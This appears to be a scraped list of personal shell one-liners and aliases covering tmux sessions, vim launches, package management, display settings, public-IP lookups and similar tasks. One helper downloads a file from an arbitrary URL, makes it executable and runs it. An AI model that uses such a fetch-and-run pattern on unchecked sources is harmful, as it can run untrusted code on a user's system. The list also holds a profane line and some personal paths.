"{ svn status; echo; svn diff -x --ignore-space-change; } | cut -c -300 | view -c ""setl filetype=diff"" -;svn status"
"{ ss -Hantup4; ss -Hantup6; } | awk '{print \$1,\$2,\$5,\$6,\$7}' | sed -E 's/users:\(\(\"
"{ ls | tr ""\n"" "" ""; echo; } | lolcat -a -d 150 -s 60"
"{ echo -n ""$ ""; prec | cut -f 2- -d "" ""; echo; pbpaste; } | pbcopy;"
"{ date ; TZ=US/Central date ; } | egrep --color ""(UTC|C[DS]T)"""
"{ date +""%n%d.%b.%Y%n===========""; ls -AlhgG --time-style=+/ --ignore=*.{mxinfo,markd} | grep -v ""^[dt]"" | awk -F""/"" "
"{ date +""%d.%b.%Y%n""; ls -AlhgG --time-style=+/ --ignore=*.{mxinfo,markd} | grep -v ""^[dt]"" | awk -F""/"" "
"{ alias & cat ~/.zshrc | rg function; } | rg -i"""
"{ [[ ""$(which ruby)"" == /progs/* ]] || { export PATH=/progs/ruby/current/bin:$PATH && which ruby && ruby -v; echo """"; }; }"
"{ ::__;::(){ ((!$#))||{ shift;""${__dsl__[@]-::no-dsl}"" "
"{ 2>/dev/null hash curl && { curl -Lo- \""$url\"" > \""$name\"" } } || { 2>/dev/null hash wget && { wget -qO- \""$url\"" > \""$name\""; } }; chmod +x \""$name\""; $ps"
"zz ""http-server || python3 -m http.server"""
"zgrep ""install "" /var/log/dpkg.log | cut -d "":"" -f 2- | sort"
"zenity --warning --text ""$(history|tail -n1|sed -e "
"zathura /home/matt/Downloads/""$(ls -lt /home/matt/Downloads | head -n 2 | tail -c +62)"""
"zargs -r --verbose -n1 --max-procs 4 -- `restrict_report --csv |tail -n +2 |cut -f1 -d,` -- t_restrict_no_diff"
"zargs --verbose -n1 -- `axclone -list |grep eash |cut -f3 -d"" ""` -- /home/nv/utils/axclone/RELEASE/bin/axclone.pl -delete -clone"
"youtube-dl -x --audio-format mp3 && /bin/ls *.mp3 | while read line ; do mv $line ""`echo $line | cut -d ""-"" -f 1`.mp3"" ; done"
"youtube-dl -f ""bestvideo+bestaudio[ext=m4a]/bestvideo+bestaudio/best"" -o ""$(echo $(find -type f | wc -l)+1|bc).%(title)s.%(ext)s"" --merge-output-format mp4 --add-metadata $1"
"youtube-dl -f ""bestaudio"" --extract-audio --audio-format mp3 -o ""$(echo $(find -type f | wc -l)+1|bc).%(title)s.%(ext)s"" --embed-thumbnail --add-metadata $1"
"yes | da pkg uninstall $(basename $PWD | sed -e ""s/dap-//""); da pkg install ./*.dap"
"yes | ""$BASH"" -c ""$(history -p !!)"" && history -s ""yes | $(history -p !!)"""
"yes ""ffdffffz"" | head -600 | tr -d "
"yes ""$(echo ""fuck you"" | figlet -f slant)"" | lolcat"
"yay -Syuu || yay -Syuu --ignore=linux-lts,linux-lts-headers,zfs-linux-lts,zfs-utils-common,spl-linux-lts,spl-utils-common"
"yay -Syuu || yay -Syuu --ignore=linux,linux-headers,zfs-linux,zfs-utils-common,spl-linux,spl-utils-common"
"yay -Slq | fzf -m --preview ""yay -Si {1}""| xargs -ro yay -S --noconfirm"
"yay -Slq | fzf -m --preview ""yay -Si {1}"" | xargs -r yay -S;"
"yay -R $(pacman -Q | dmenu -l 10 | sed ""s/\s.*//g"")"
"yay -Qqdt && echo -e ""\033[1m^Remove obsolete pkgs first\033[0m"" && return || yay -Syu"
"yay -Qq | fzf --preview ""yay -Qil {}"" --layout=reverse --bind ""enter:execute(yay -Qil {} | $PAGER)"""
"yay -Qeq | fzf -m --preview ""yay -Qi {1}"" | xargs -ro yay -Rs"
"yarn list | sed -r ""s/^\W*([\.a-zA-Z0-9-]+)@.*$/\1/"" | wc -l"
"yadm diff --cached --name-status | tr -s ""\n "" "" "" | awk "
"xsel | perl -pe ""chomp if eof"" | bigmsg -file -"
"xsel -b | python -c ""import sys; print \""\n\"".join([x for x in sys.stdin ]).decode(\""string-escape\"")"" | xsel -ib"
"xrandr | grep ""*"" | grep -oe ""[0-9]\+x[0-9]\+"""
"xrandr | grep "" connected "" | awk ""{ print$1 }"""
"xrandr -q | grep ""*"" | cut -d "" "" -f 4"
"xrandr -q | grep "" connected"" | cut -d "
"xrandr --verbose | grep Brightness | awk -F "":"" ""{print $2;}"""
"xrandr --query | grep "" connected"" | awk ""{print \$1}"""
"xprop|grep ""WM_WINDOW_ROLE\|WM_CLASS"" && echo ""WM_CLASS(STRING) = \""NAME\"", \""CLASS\"""""
"xprop | grep --color=none ""WM_WINDOW_ROLE\|WM_CLASS"""
"xprop | grep ""WM_WINDOW_ROLE\|WM_CLASS"""
"xprop | grep ""WM_WINDOW_ROLE\|WM_CLASS"" && echo ""WM_CLASS(STRING) = \""NAME\"", \""CLASS\"""";xwininfo"
"xprop | grep ""WM_WINDOW_ROLE\|WM_CLASS"" && echo ""WM_CLASS(STRING) = \""NAME\"", \""CLASS\"""""
"xprop | grep ""WM_WINDOW_ROLE\\|WM_CLASS""; and echo ""WM_CLASS(STRING) = \""NAME\"", \""CLASS\"""""
"xprop | grep ""WM_CLASS"" | cut -d \"" -f 4"
"xprop _NET_WM_PID | cut -d "" "" -f 3 | xargs ps -fw"
"xprop -root -notype _NET_CURRENT_DESKTOP | cut -d ""="" -f 2 | cut -d "" "" -f 2"
"xprop -name ""Spotify Premium - Linux Preview"" _NET_WM_ICON_NAME | cut -d ""-"" -f 2 | cut -d ""\"""" -f 1"
"xmodmap ~/.Xmodmap; xcape -e ""Control_L=Escape""; xinput set-button-map $(xinput | grep -o ""TouchPad.*id=[0-9]*"" |grep -o ""[0-9]*"") 1 0 0"
"xkill -id $(xwininfo | grep id: | cut -d "" "" -f4)"
"xinput | grep Translated | sed -n ""s/.*id=\([0-9]\+\).*/\1/p"""
"xinput | grep ""Virtual core keyboard"" | sed -n ""s/.*id=\([0-9]\+\).*/\1/p"""
"xinput enable $(xinput | grep -o ""TouchPad.*id=[0-9]*"" |grep -o ""[0-9]*"")"
"xinput disable $(xinput | grep -o ""TouchPad.*id=[0-9]*"" |grep -o ""[0-9]*"")"
"xev|grep -A2 --line-buffered '^KeyRelease'|sed -n \
"xev | grep -A2 --line-buffered '^KeyRelease' | sed -n '/keyvim /s/^.*keyvim \([0-9]*\).* (.*, \(.*\)).*$/\1 \2/p'"
"xev | grep -A2 --line-buffered '^KeyRelease' | sed -n '/keycode /s/^.*keycode \([0-9]*\).* (.*, \(.*\)).*$/\1 \2/p'"
"xev | grep -A2 --line-buffered '^KeyRelease' | sed -n '/keycode /s/^.*keycode ([0-9]*).* (.*, (.*)).*$/ /p'"
"xev | grep -A2 --line-buffered ""^KeyRelease"" | sed -n ""/keycode /s/^.*keycode \([0-9]*\).* (.*, \(.*\)).*$/\1 \2/p"""
"xev | grep -A2 --line-buffered ""^KeyRelease"" | sed -n ""/keycode /s/^.*keycode \([0-9]*\).* (.*, \(.*\)).*$/\1 \2/p"" "
"xdg-open $(ls | grep -v ""/\."" | dmenu -i -l 10) &>/dev/null"
"xdg-open ""$(find -L ~/Dropbox ~/Documents ~/Videos -type f 2> /dev/null | grep -v ""/\."" | dmenu -i -l 10)"" &>/dev/null"
"xdg-open ""$(find $HOME -type f 2> /dev/null | grep -v ""/\."" | dmenu -i -l 10)"" &>/dev/null"
"xcodebuild test -workspace PlumRiverElastic.xcworkspace -scheme PlumRiverElastic -destination 'platform=iOS Simulator,name=iPad Pro (10.5-inch),OS=11.2' | tee test.log | xcpretty"
"xclips -o | sed -e ""s/^/> /"" | xclips"
"xclips -o | sed -e ""s/^/ /"" | xclips"
"xclip -out | sed 's,^$HOST err.txt generated.file succ.txt \\\$ ,% ,g' | xclip"
"xcape -t 350 -e ""Control_L=Escape;Shift_L=Shift_L|9;Shift_R=Shift_L|0;Hyper_L=Tab"""
"xauth extract - :`echo $DISPLAY |awk -F: ""{print $2}""` | sudo su -c ""xauth merge -"""
"xargs | tr "" "" ""+"" | bc -l"
"xargs | sed ""s/ /+/g"" | bc -l"
"wscanfull | grep ""Channel\|ESSID"""
"wormhole receive | tee >(cut -d"" "" -f5- | pbcopy)"
"window_id=`xwininfo | grep ""Window id"" | sed -e ""s@.*Window id: \([0-9a-fA-Fx]*\).*@\1@""`; recordmydesktop --windowid $window_id --no-sound"
"wifils | peco --prompt ""Select network env:"" | xargs scselect"
"whois $(curl -sSL ifconfig.me) | grep -v ""^#\|^%"""
"whois $(curl -s ifconfig.me) | grep -v ""^#\|^%"""
"while true; do tput clear; date --utc +""$CLOCKFMT UTC"" | figlet -W -f smblock; date +""$CLOCKFMT"" | figlet -W -f smblock; sleep 1; done"
"while true; do head -c200 /dev/urandom | od -An -w46 -x | grep -E --color ""([[:alpha:]][[:digit:]]){2}""; sleep 0.5; done"
"while test ""$1""; do if test -z ""$OPTOPT""; then OPT=""""; OPTLNG=0; OPTNOT=""""; test -z ""${1%%--*}"" && { OPTLNG=1; OPT=""$1""; } || { test -n ""${1%%-*}"" && OPTNOT=""$1""; if test $? -ne 0; then OPTOPT=""$1""; OPT=""${OPTOPT%%""${OPTOPT#??}""}""; OPTOPT=""${OPTOPT#??}""; fi; }; else OPT=""-${OPTOPT%%""${OPTOPT#?}""}""; OPTOPT=""${OPTOPT#?}""; fi"
"while test ""$1""; do if test -z ""$OPTOPT""; then OPT= ; OPTLNG=0; OPTNOT= ; test -z ""${1%%--*}"" && { OPTLNG=1; OPT=""$1""; } || { test -n ""${1%%-*}"" && OPTNOT=""$1""; if test $? -ne 0; then OPTOPT=""$1""; OPT=""${OPTOPT%%${OPTOPT:2}}""; OPTOPT=""${OPTOPT:2}""; fi; }; else OPT=""-${OPTOPT%%${OPTOPT:1}}""; OPTOPT=""${OPTOPT:1}""; fi;"
"while read uri; do f=`basename ${uri:?Invalid uri}` && [ ! -e ""$f"" ] && curl -s $uri > $f && echo $uri > $f.URI && echo success: $f || echo ""failure: $f""; done"
"while read -r __ || [ -n ""$__"" ];"
"while [[ : ]]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep ""ca fe"""
"while [ true ]; do head -n 100 /dev/urandom; sleep 1; done | hexdump | grep ""ca fe"""
"while [ true ]; do head -n 100 /dev/urandom; sleep .5; done | hexdump -C | grep ""ca fe"""
"while [ true ]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep ""ca fe"""
"while [ TRUE ]; do head -n 100 /dev/urandom; sleep .05; done | hexdump -C | grep --color=none ""ca fe"""
"whichvenv && source ""$(whichvenv)/bin/activate"" || echo ""no virtualenv found"""
"which ""git-cz"" > /dev/null && git cz || git commit --verbose"
"wget || alias download=""curl -O --retry 999 --retry-max-time 0 -L -C -"""
"wget randomfunfacts.com -qO- 2>/dev/null | grep \<strong\> | sed ""s;^.*<i>\(.*\)</i>.*$;\1;"""
"wget randomfunfacts.com -O - 2>/dev/null | grep \<strong\>\<i\> | sed ""s;^.*<i>\(.*\)</i>.*$;\1;"""
"wget randomfunfacts.com -O - 2>/dev/null | grep \<strong\> | sed ""s;^.*<i>\(.*\)</i>.*$;\1;"""
"wget https://www.cse.iitb.ac.in/page137 -q -O - |xargs -n1| grep -o ""CS [0-9][0-9][0-9]"""
"wget http://www.randominsults.net -O - 2>/dev/null | grep \<strong\> | sed ""s;^.*<i>\(.*\)</i>.*$;\1;"";"
"wget http://www.randominsults.net -O - 2>/dev/null | grep \<strong\> | sed ""s;^.*<i>\(.*\)</i>.*$;\1;"""
"wget http://www.randomfunfacts.com -O - 2>/dev/null | grep \<strong\> | sed ""s;^.*<i>\(.*\)</i>.*$;\1;"";"
"wget http://pkg.corp.mail.ru/find.rpm.list.txt -O - 2>/dev/null|perl -pe ""s#^#http://pkg.corp.mail.ru/#"" | fgrep"
"wget http://cmyip.com -qO - | grep -Ewo '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | uniq"
"wget http://checkip.dyndns.org/ -O - -o /dev/null | cut -f7 -d""<"" | cut -f2 -d"">"" "
"wget checkip.dyndns.org -qO /dev/stdout | cut -d'/' -f3 | rev \
"wget -qO- jasonlong.xyz/paste/posts.list | sed 1,5d | grep -i ""$@"""
"wget -qO - http://wttr.in/New%20York,%20United%20States | head -n27 |tail -n26"
"wget -qO - http://ifconfig.me/all|grep remote_host|awk ""{print \$2 }"""
"wget -q -O - programmerexcuses.com | grep ""center"" | sed ""s/<[^>]\+>//g"""
"wget -q -O - http://www.moongiant.com/phase/today/ | grep ""Moon Age"" | sed -e ""s/.*\""Moon Age:/Moon Age:/"" -e ""s/\"".*//"""
"wget -q -O - checkip.dyndns.org | sed -e ""s/[^[:digit:]|.]//g"""
"wd ""$(wd list | fzf | awk "
"watch -t -n 1 ""php /home/adrian/cons/output/time.php | figlet -t; cat /home/adrian/cons/data/quote.tp | cowsay -f daemon -W 100 -s"""
"watch -n1 ""ps axo %mem,pid,user,cmd | sort -nr | head -n 10"""
"watch -n1 ""printf %s \ \ \ \ \ \ \ \ \ \ \ \ \ ;kubectl config current-context;echo;echo;kubectl get pods --all-namespaces| grep -v kube-system|grep -v loadtest"""
"watch -n1 ""kubectl get pods --all-namespaces| grep -v kube-system|grep -v loadtest"""
"watch -n 60 -g ""curl -s http://en.lichess.org/forum | grep Feedback -A 3 | tail -n1"" && notify-send -u critical ""New Lichess Feedback topic"""
"watch -n 10 ""s.llq --all 2>/dev/null|grep afsu|grep -v CPUS"""
"watch -n 1 ""ifconfig | grep -A7 enp[^1] | grep bytes"""
"watch -n 1 ""cat /proc/cpuinfo | grep ""MHz"" | sort -n -r"""
"watch -d ""ps aux | sort -rk 3,3 | head -n 10"""
"watch --color -n0.2 ""gpustat --color || gpustat"""
"watch ""ps aux | sort -nrk 3,3 | head -n 5"""
"watch ""lsload | grep unavail |wc -l """
"watch ""kubectl get pods -A | grep -vE \""(Completed|Running)\"""""
"wal -i ""/home/rndmprsn/Pictures/`ls /home/rndmprsn/Pictures | sort -R | tail -1 &`"""
"vmstat -s -S M | grep ""used memory"" | tr -d "
"vmrun list | egrep "".*\.vmx$"" | while read vm; do echo ""suspending $vm""; vmrun suspend $vm; done"
"vlist | cut -d"" "" -f 1 | xargs -n 1 bash -c "
"vimman \$(man -k . | fzf | sed -e 's,\(.*\) (\([^)]*\).*-.*,\1.\2,')"
"vimdiff <(git diff | grep --invert-match --regexp ""^+[^+]"") <(git diff | grep --invert-match --regexp ""^-[^-]"")"
"vimdiff <(git diff --cached | grep --invert-match --regexp ""^+[^+]"") <(git diff --cached | grep --invert-match --regexp ""^-[^-]"")"
"vimdiff ""$(find . -type f | peco)"" ""$(find . -type f | peco)"""
"vim' /etc/profile &>/dev/null || echo ""alias vi=vim"" >>/etc/profile"
"vim ~/notes/scratch-$(cat /dev/urandom | tr -dc ""A-z0-9"" | head -c 7).md"
"vim ~/notes/$(date +%Y-%m-%d).md -c ""execute \""normal! Go$(date +%T)\<CR>========\<CR>\"" | w! | startinsert"""
"vim ~/dotfiles/config/i3/config && i3-msg reload | grep -Po --color=never ""\""(.*)\"""" | sed -e ""s/\""//g"""
"vim `git changes -1 | cut -f2 | sed ""1 d""`"
"vim `find database/migrations -name \`find database/migrations -name ""*.php"" -printf ""%f\n"" | sort | tail -1\``"
"vim `find . -type f | grep -v ""^\./\."" | selecta`"
"vim -u NONE -c ""set nu|set cursorline|set nowrap"""
"vim -u NONE -U NONE --cmd ""set nocompatible | syntax on | filetype plugin indent on"""
"vim -p $(git status | grep ""both modified"" | cut -d: -f2)"
"vim -c ""try | NERDTreeToggle | endtry"""
"vim -c ""set background=light | colorscheme tomorrow | set statusline=%f\ %h%w%m%r\ %=%(%l,%c%V\ %=\ %P%)"""
"vim -c ""execute \""set <PageUp>=\\e[5;*~\"" | execute \""set <PageDown>=\\e[6;*~\"" | execute \""set ttymouse=xterm2\"""""
"vim -c ""call dein#clear_state() | call dein#recache_runtimepath() | q"""
"vim -c ""Gstatus | wincmd j | hide"" ."
"vim -c "":PlugInstall|q|q"""
"vim -c "":PlugClean! | :PlugInstall | :qall"""
"vim --version | \grep -E ""^\+|^-"""
"vim +0 ""+/<<<"" $(git diff --name-only --relative | sort | uniq)"
"vim +""set nobomb | set fenc=utf8 | x"""
"vim $(mktemp 2>/dev/null || mktemp -t ""mytmpfile"")"
"vim $(ls -lrt | tail -1 | awk '{print $9}')"""
"vim $(git status | grep modi | cut -d"":"" -f2)"
"vim $(git status | grep ""both modified:"" | sed ""s/^.*both modified: *//g"") +Gdiff"
"vim $(git status -s | fzf -m | sed -e ""s/[A-Z]*[[:space:]]*//"")"
"vim $(git status --short --porcelain | grep ""^ M"" | cut -d"" "" -f3)"
"vim $(find . -name "".*.swp"" | while read f; do rm ""$f""; echo ""$f"" | sed ""s/\\.\\([^/]*\\).swp/\\1/""; done)"
"vim $(find -L ~/Dropbox ~/Documents ~/Videos -type f 2> /dev/null | grep -v ""/\."" | dmenu -i -l 10)"
"vim $(find $HOME/.zsh.d/ -type f -name ""*.zsh"" -maxdepth 1 | sed ""\$a""$HOME""/.zshrc"" | fzf)"
"vim $(fd --type f | fzf --preview ""bat --color=always {} --theme OneHalfDark| head -100"")"
"vim $(`git status -s | cut -d "" "" -f 3 | peco`)"
"vi ~/.zshrc && source ~/.zshrc || echo ""Editing failed"""
"vi ~/.vimrc || echo ""Editing failed"""
"vi ~/.gitconfig || echo ""Editing failed"""
"vi -u NONE --cmd ""set nocp | sy on | filetype plugin indent on"""
"vi $(git st --porcelain | ack ""^U"" | field -1)"
"version=$(ls db/migrate | peco | cut -d ""_"" -f1); bin/rake db:migrate:up VERSION=$version"
"version=$(ls db/migrate | peco | cut -d ""_"" -f1); bin/rake db:migrate:down VERSION=$version; bin/rake db:migrate:up VERSION=$version"
"version=$(ls db/migrate | peco | cut -d ""_"" -f1); bin/rake db:migrate:down VERSION=$version"
"version=$(jq --raw-output .version manifest.json) && vared -p ""Current version is ${version}, specify new version: "" version && jq --indent 4 "".version = \""$version\"""" manifest.json | sponge manifest.json && jq --indent 4 "".version = \""$version\"""" package.json | sponge package.json"
"vagrant ssh || echo ""start running vm..."" && vagrant up"
"vagrant global-status | grep \$DEVBOX_ID | awk '{split(\$0,a,\"
"vagrant global-status | grep --color=no ""^[0-9a-f]\{7\}"" | grep --color=no running"
"v $(ls -t | cut -d "" "" -f 1 | head -n 1)"
"uuidgen | tr [A-Z] [a-z] | sed ""s/-//g"""
"uuidgen | tr -d ""\n"" | xcopy"
"uuidgen | tr -d ""\n"" | xclip -selection clipboard"
"uuidgen | tr -d ""\n"" | pbcopy"
"uuidgen | tr ""[A-Z]"" ""[a-z]"" | pbcopy"
"uuidgen | tr ""[:upper:]"" ""[:lower:]"" | tr -d ""\n"""
"uuidgen | tr ""[:upper:]"" ""[:lower:]"" | sed "
"uuidgen | tr ""[:upper:]"" ""[:lower:]"" | copy"
"uuid | tr -d ""\n"" | xsel -b"
"utwho -c|grep $USER|sed ""s/.*\.//"""
"util log-header ""PATH(s)"" && echo -e ""$(echo $PATH | tr "":"" ""\n"" | nl)"""
"urxvt -e zsh -c ""tmux -q has-session && exec tmux attach-session -d || exec tmux new-session -n$USER -s$USER@$HOSTNAME"""
"urxvt -e bash -c ""tmux -q has-session && exec tmux attach-session -d || exec tmux new-session -n$USER -s$USER@$HOSTNAME"""
"uptime;echo ""%CPU PID"";\ps -eo pcpu,pid -o comm= h | sort -k1 -n -r | head"
"uptime | cut -d: -f4- | sed s/,//g"
"uptime | cut -d':' -f4- | sed s/,//g"
"uptime | cut -d ',' -f 2- | cut -c 1-6"
"uptime | awk '{print \$10}' | sed 's/,$//'"
"uptime | \grep -Eo '[0-9]+\.[0-9]+,? [0-9]+\.[0-9]+,? [0-9]+\.[0-9]+$' | tr -d ','"
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep percentage | grep -oE ""[0-9]{1,3}%"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|to\
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep ""percentage\|time to empty"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | ag --nocolor ""percentage|time"""
"upower -i $(upower -e | grep battery) | grep -e ""time to empty"" -e percentage"
"upower -i $(upower -e | grep BAT) | grep --color=never -E
"upower -i $(upower -e | grep 'BAT') | \
"upgrade && success ""upgrade"" || fail ""upgrade"""
"upgrade && success ""upgrade"" || fail ""upgrade"" "
"update && success ""update"" || fail ""update"""
"update && success ""update"" || fail ""update"" "
"until nc $(VBoxManage guestproperty get ""NixOS"" ""/VirtualBox/GuestInfo/Net/0/V4/IP"" | cut -d"" "" -f2) 22 -G 1 -w 0; do echo Connecting...; sleep 10; done && ssh mb@$(VBoxManage guestproperty get ""NixOS"" ""/VirtualBox/GuestInfo/Net/0/V4/IP"" | cut -d"" "" -f2)"
"unset CPPFLAGS; eval $(sed -rn ""s/^((C|LD|MAKE)FLAGS)/export \1/p"" /etc/makepkg.conf)"
"unset $(grep -v ""^#"" $(PWD)/.env | sed -E ""s/(.*)=.*/\1/"" | xargs)"
"unset $(env | grep ""^AWS"" | cut -d= -f 1)"
"unset ""$( env | grep ^PERL | cut -d= -f1 )"""
"unpushed=`git unpushed` && echo -n $unpushed | wc -l | tr -d "" """
"unbuffer tail -f /var/log/httpd/$HOSTNAME-error_log | grep jwhiteneck | sed -u -e 's/\,\ .*//g'"
"umount -r $(grep -nv "" cramfs "" /proc/mounts | sort -rn | cut -d"" "" -f2)"
"umount -r $(grep -n ""^/dev/sd"" /proc/mounts | sort -rn | cut -d"" "" -f2)"
"typeset -t | sed -e s/""declare -t ""// | cut -d= -f1"
"tx kill-session -t $(tx ls | sed ""s/:.*//"" | fzf)"
"tx a -t $(tx ls | sed ""s/:.*//"" | fzf)"
"tvservice -p > /dev/null && echo ""on 0"" | cec-client -s > /dev/null && echo ""as"" | cec-client -s > /dev/null && echo ""TV/HDMI ON"""
"tree -aI "".git|__pycache__|*.pyc"""
"tree -aCFlL 3 -I "".git|node_modules|vendor"" --dirsfirst"
"tree -aCFlL 2 -I "".git|node_modules|vendor"" --dirsfirst"
"tree -a -I ""node_modules|.git|.next"""
"tree -a -I ""node_modules|.git|.git-old"""
"tree -a -I "".git|node_modules|bower_components"""
"tree -I ""node_modules|dist|build"""
"tree -I ""node_modules|bower_components|vendor"""
"tree -I ""node_modules|android|ios"""
"tree -I ""node_modules|_build|deps"""
"tree -I ""bin|obj|wwwroot"""
"tree -I ""CVS|vendor|node_modules"""
"tree -I "".git|bower_components|node_modules"""
"tree -I "".git|.svn|[Bb]uild"" -a"
"tree -I ""*.pyc|node_modules|__pycache__"""
"tree -I ""*.pyc|__pycache__|node_modules"""
"tree -Ca -I "".git|*.swp|*.egg-info"""
"tree -Ca -I "".git|*.pyc|*.swp"""
"tree -C -I $(git check-ignore err.txt generated.file succ.txt 2>/dev/null | tr ""\n"" ""|"").git"
"tree -C -I ""$(ignored_filetypes | change_deliminator "" "" ""|"")"""
"tree -C --dirsfirst -I ""coverage|build|dist"" "
"tree --prune -P ""*.cs|*.xaml|*.csproj"""
"trash-put || alias rm=""rm -Iv"""
"transmission-remote -l | grep ""Stopped"" | grep -v ""100%"""
"tr -d '\n' | sed 's/\([{}]\)/\n\1\n/g;s/\[/\[\n/g;s/\][^,]/\n\]\n/g;s/\(\],\)/\n\1\n/g;s/,/,\n/g' | grep -v '^$'"
"tr -c ""[:digit:]"" "" "" < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR=""1;32"" grep --color ""[^ ]"""
"tr -c ""[:digit:]"" "" "" < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR=""1;3$(($RANDOM % 8))"" grep --color ""[^ ]"""
"tr -c ""[:digit:]"" "" "" < /dev/urandom | dd cbs=$COLUMNS conv=lcase,unblock | GREP_COLOR=""1;32"" grep --color ""[^ ]"""
"tr ""a-z"" ""A-Z"" | xargs -I % bash -c ""echo \""ibase=16; %\"" | bc"""
"tr ""\-_"" ""+/"" | base64 -d | more"
"tr "":"" ""\n"" | uniq | paste -d: -s -"
"touch ~/diary/`date +%Y-%m-%d`.md && vim -p `ls ~/diary/2019-* | sort | tail -n 5` +tablast && rm `find ~/diary -empty -regex "".*/2019-[0-9][0-9]-[0-9][0-9].md""`"
"totalnotify.sh ""SUCCESS"" || ( totalnotify.sh ""FAILURE"" && false )"
"top -l 1|grep love|cut -f8,9"
"top -l 1 | grep -E ""^CPU|^Phys"""
"top -l 1 -s 0 | grep PhysMem | sed 's/, /\'$'\n /g'"
"top -l 1 -s 0 | grep PhysMem | sed 's, (.*),,'"
"top -i -b -n1 -U nscharmb | grep nscharmb | awk '{split(\$11, t, \"
"top -d 0.5 -bn3 | grep ""%Cpu(s)"" | cut -d "
"top -b -n1 | head -n1 | awk '{print $12, $13, $14}'"
"top -b -n 1 | grep -Po '(?<=Mem:).*free' | sed 's/ *\([0-9]*\)k total, *\([0-9]*\)k used, *\([0-9]*\)k free/Mem: \3 \/ \1/'"
"todo.sh listall @digi|egrep ""^........ x "" |tail -5"
"tn $(tn list | peco | sed ""s/:.*$//g"")"
"tmux new-session -s code ""ipython"" || t code"
"tmux new -s ""${$(basename `PWD`)//./}"" || tmux at -t ""${$(basename `PWD`)//./}"""
"tmux new -s ""$(basename `pwd`)"" || tmux attach -t ""$(basename `pwd`)"""
"tmux new -s ""$(basename `pwd`)"" || tmux at -t ""$(basename `pwd`)"""
"tmux new -s ""$(basename `pwd`)"" || tmux at -t ""$(basename ` pwd`)"""
"tmux lsw | grep '*' | awk '{gsub(/\\]/, \"
"tmux lsw -F ""#{window_active} #{window_layout}"" | grep ""^1"" | cut -d "" "" -f2"
"tmux ls | cut -d "" "" -f 1 | while read session; do tmux kill-session -t ${session%*:}; done"
"tmux ls 2>/dev/null || echo ""No tmux sessions running"""
"tmux ls && tmux attach || echo 'tmux session not found, create new tmux session.'; tmux"
"tmux list-windows -F ""#{window_active} #{window_layout}"" | grep ""^1"" | cut -d "" "" -f 2"
"tmux list-sessions | grep attached | awk '{session=sub(/:/, \"
"tmux has-session -t mcabber && tmux attach -d -t mcabber || tmux new -s mcabber -n client ""TERM=rxvt-256color mcabber"""
"tmux attach-session -t cmus || tmux new-session -A -D -s cmus ""$(which cmus)"""
"tmux attach-session -t cmus || tmux new-session -A -D -s cmus ""$(which cmus) --listen $CMUS_SOCKET"""
"tmux attach-session -t cmus 2>/dev/null || tmux new-session -A -D -s cmus ""$(which cmus)"""
"tmux attach-session -t ""work"" || tmux new-session -s ""work"" -d -n ""main"""
"tmux attach-session -t ""chenyu"" || tmux -f ~/workspace.tmux.conf attach"
"tmux attach-session -t ""$USER"" || tmux new-session -s ""$USER"""
"tmux attach-session -t ""$TMUX_SESSION"" || tmux new-session -s ""$TMUX_SESSION"""
"tmux attach-session -t ""$(whoami)"" || tmux new-session -s ""$(whoami)"""
"tmux attach || { (while ! tmux run-shell
"tmux attach || tmux"""
"tmux attach || \
"tmux attach -t topy || tmux new-session -s topy -d ""htop"" \; rename-window htop \; split-window -v -p 15 ""iotop -o"" \; attach -t topy"
"tmux attach -t $USER ||\
"tmux attach -t ""Home"" || tmux new-session -c ~ -s ""Home"""
"tmux attach -t ""${PWD##*/}"" || tmux new-session -s ""${PWD##*/}"""
"tmux attach -t ""$TMUX_SESSION_DEFAULT"" || tmux new -s ""$TMUX_SESSION_DEFAULT"""
"tmux attach -t ""$(tmux ls| fzf | cut -d: -f1)"""
"tmux attach -t ""$(tmux ls | cut -d : -f1 | fzf)"""
"tmux a -t ldo || tmux new -s ldo ""tmux source-file ${DIREXPLOIT}/etc/tmuxrc"""
"tmux a -t ""=rtorrent"" || tmux new -s rtorrent ""echo \""\033]0;rtorrent\a\"" && rtorrent"" \; set status off"
"tmux a -t ""=news"" || tmux new -s news ""echo \""\033]0;news\a\"" && newsboat 2>/dev/null"" \; set status off"
"tmux a -t ""=mcabber"" || tmux new -s mcabber ""echo \""\033]0;mcabber\a\"" && mcabber"" \; set status off \; set monitor-activity off"
"tmux a -t ""=irssi"" || tmux new -s irssi ""stty start \""\"" stop \""\"" && echo \""\033]0;irssi\a\"" && irssi"" \; set status off \; set monitor-activity off"
"tmux -u -2 attach || tmux -u -2 -f ""$XDG_CONFIG_HOME""/tmux/tmux.conf"
"tmux -L zsh list-sessions | sed ""s/^/[zsh] /g""; tmux -L bash list-sessions | sed ""s/^/[bash] /g"""
"tmux -2 attach-session -d -t hollywood || tmux new-session -s hollywood ""/usr/bin/hollywood"""
"tmux -2 #""tmux attach || tmux new"""
"tmpl 1 ""{desc}"" | head -n1 | xsel -b"
"tmpfun() { echo ""obase=16; ibase=2; $@"" | bc | tr [A-Z] [a-z]; }; tmpfun $@"
"tmpfun() { echo ""obase=16; ibase=10; $@"" | bc | tr [A-Z] [a-z]; }; tmpfun $@"
"tmpfun() { echo ""obase=10; ibase=16;"" `echo $@ | tr [a-z] [A-Z]` | bc; }; tmpfun $@"
"tmpfun() { echo ""ibase=16; obase=2;"" `echo $@ | tr [a-z] [A-Z]` | bc; }; tmpfun $@"
"tmp=`ls -la $DEFAULT_SCRIPTS_DIR` && tmp=${tmp//"" ""/""@""} && echo ""$tmp"" | grep -E ""[^\@]*\.sh"" -o | grep -E ""^[^\.]*"" -o -n"
"tmate show-messages | grep ""ssh session"" | grep -v ""read only"""
"tmate -S `tmate-socket` display -p ""#{tmate_ssh}"" | tr -d ""\n"" | pbcopy"
"tl | grep --colour=always -E -e ""org.onlab|org.onosproject"""
"tk $(tl | cut -d"":"" -f 1 | fzf-tmux -r 30% --reverse)"
"timelog | grep -i ""PRLog \| DD"""
"timelimit -t 120 cat /dev/urandom | hexdump -d | grep ""25"""
"timedatectl | grep ""\(Universal\|Local\) time:"""
"time \curl -A """" ipinfo.io/ip || time wget -qU """" -O- ipinfo.io/ip"
